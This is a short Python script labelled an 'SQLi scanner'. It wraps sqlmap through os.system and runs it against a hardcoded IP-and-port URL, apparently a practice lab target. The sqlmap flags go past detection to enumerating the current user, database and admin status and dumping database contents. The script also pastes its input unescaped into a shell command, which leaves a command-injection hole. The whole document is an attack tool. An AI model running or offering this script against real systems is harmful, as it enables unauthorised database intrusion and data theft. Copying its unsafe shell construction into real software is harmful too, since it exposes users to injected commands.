import os

__name__ = "SQLi scanner"
__description__ = "perform basic SQLi to enumerate vulns"

def sql_map(domain):
    """Uses sqlmap to detect prescence of SQL injection vulnerabilities"""
    command = "sqlmap -u " + domain + " --batch --banner --current-user --current-db --is-dba --dump"
    output = os.system(command)
    
sql_map("http://159.65.60.16:30229/case1.php?id=1")
